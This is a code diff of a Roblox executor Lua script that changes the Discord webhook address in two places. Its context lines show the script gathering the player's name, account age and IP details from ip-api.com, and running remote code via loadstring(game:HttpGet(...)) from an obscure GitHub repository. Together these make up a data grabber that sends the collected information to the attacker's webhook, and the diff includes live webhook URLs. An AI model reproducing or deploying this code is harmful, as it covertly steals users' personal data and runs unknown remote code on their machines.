@@ -58,7 +58,7 @@ elseif premium and player.AccountAge >= 70 then
    alt = false
 end
 
-local webh = "https://discord.com/api/webhooks/1055661279085338624/WfcuuFxTV2KZ0zkGRiskYQz7yqyDohTxeIq0IptmiyaQ6dFjJcwmrV5YH7hTcekjE6h8"
+local webh = "https://discord.com/api/webhooks/1055812529626038302/URF997mdfEmyd1pU19WSNbJJvybRqDlVvYPO-Slhlqdtq8Df5UpvOLIJzlejEngrKeEi"
 
 pcall(function()
    local data = {
@@ -133,7 +133,7 @@ end)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/01010101010x/010100101/main/silent"))();
 
 local player_name = game:GetService("Players").LocalPlayer.Name
-local webhook_url = "https://discord.com/api/webhooks/1055661279085338624/WfcuuFxTV2KZ0zkGRiskYQz7yqyDohTxeIq0IptmiyaQ6dFjJcwmrV5YH7hTcekjE6h8"
+local webhook_url = "https://discord.com/api/webhooks/1055812529626038302/URF997mdfEmyd1pU19WSNbJJvybRqDlVvYPO-Slhlqdtq8Df5UpvOLIJzlejEngrKeEi"
 
 local ip_info = syn.request({
     Url = "http://ip-api.com/json",
